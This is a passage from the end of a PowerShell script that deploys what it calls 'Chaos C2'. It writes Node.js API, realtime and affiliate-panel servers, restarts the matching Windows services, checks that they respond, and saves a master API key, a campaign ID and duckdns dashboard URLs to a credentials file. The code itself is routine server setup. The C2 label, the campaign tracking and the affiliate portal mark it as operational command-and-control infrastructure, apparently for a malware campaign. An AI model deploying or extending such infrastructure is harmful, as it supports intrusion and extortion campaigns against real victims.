const port = process.env.PORT || 3000;
app.listen(port, () => console.log('API on ' + port));
"@
Set-Content "C:\ByteBane Server\App\Api\index.js" -Value $apiIndex -Encoding UTF8

$realtimeJs = @"
const http = require('http');
const app = require('./realtime');
const port = process.env.PORT || 3001;
app.listen(port, () => console.log('Realtime on ' + port));
"@
Set-Content "C:\ByteBane Server\App\Api\realtime.js" -Value $realtimeJs -Encoding UTF8

$affiliateServer = @"
const next = require('next');
const dev = process.env.NODE_ENV !== 'production';
const app = next({ dev, dir: 'C:\ByteBane Server\App\Affiliate' });
const handle = app.getRequestHandler();
app.prepare().then(() => {
  const server = require('http').createServer((req, res) => handle(req, res));
  server.listen(3002, () => console.log('Affiliate on 3002'));
});
"@
Set-Content "C:\ByteBane Server\App\Affiliate\server.js" -Value $affiliateServer -Encoding UTF8

# Restart services to pick up entry points
net stop ChaosAPI 2>$null; net start ChaosAPI 2>$null
net stop ChaosRealtime 2>$null; net start ChaosRealtime 2>$null
net stop ChaosAffiliate 2>$null; net start ChaosAffiliate 2>$null

Start-Sleep 10

# =====================================================================
# VERIFY
# =====================================================================
Write-Step "VERIFICATION"

$checks = @(
    @{Url="http://localhost:80"; Name="Dashboard"},
    @{Url="http://localhost:8080"; Name="Affiliate"},
    @{Url="http://localhost:3000/api/health"; Name="API"},
    @{Url="http://localhost:3001"; Name="Realtime"}
)

$passed = 0
foreach ($check in $checks) {
    try { 
        $r = iwr $check.Url -UseBasicParsing -TimeoutSec 5 
        if($r.StatusCode -eq 200) { Write-Success "$($check.Name): OK"; $passed++ } 
        else { Write-Warn "$($check.Name): HTTP $($r.StatusCode)" } 
    } catch { Write-ErrorMsg "$($check.Name): FAILED" }
}

Write-Host "`n=== DEPLOYMENT COMPLETE ===`n" -Fore Magenta
Write-Host "Dashboard: https://bytebane.duckdns.org"
Write-Host "Affiliate: https://affiliate.bytebane.duckdns.org"
Write-Host "API: https://bytebane.duckdns.org/api/v2"
Write-Host "Realtime: https://bytebane.duckdns.org:3001"
Write-Host "`nMaster Key: $MasterApiKey"
Write-Host "Campaign ID: $CampaignId"
Write-Host "`nCredentials saved to C:\ByteBane Server\DEPLOYMENT_CREDENTIALS.txt"

# Save credentials
$credContent = @"
# Chaos C2 Deployment Credentials - $(Get-Date)
MASTER_API_KEY=$MasterApiKey
CAMPAIGN_ID=$CampaignId
CAMPAIGN_NAME=$CampaignName
DOMAIN=bytebane.duckdns.org
DASHBOARD_URL=https://bytebane.duckdns.org
AFFILIATE_URL=https://affiliate.bytebane.duckdns.org
API_URL=https://bytebane.duckdns.org/api/v2
REALTIME_URL=https://bytebane.duckdns.org:3001
MASTER_API_KEY=$MasterApiKey
CAMPAIGN_API_KEY= (create in dashboard)
"@
$credContent | Out-File "C:\ByteBane Server\DEPLOYMENT_CREDENTIALS.txt" -Encoding UTF8
Write-Success "Credentials saved to C:\ByteBane Server\DEPLOYMENT_CREDENTIALS.txt"
Write-Warn "SECURE THIS FILE - IT CONTAINS ALL ACCESS CREDENTIALS"

Write-Success "Deployment complete! 🎉"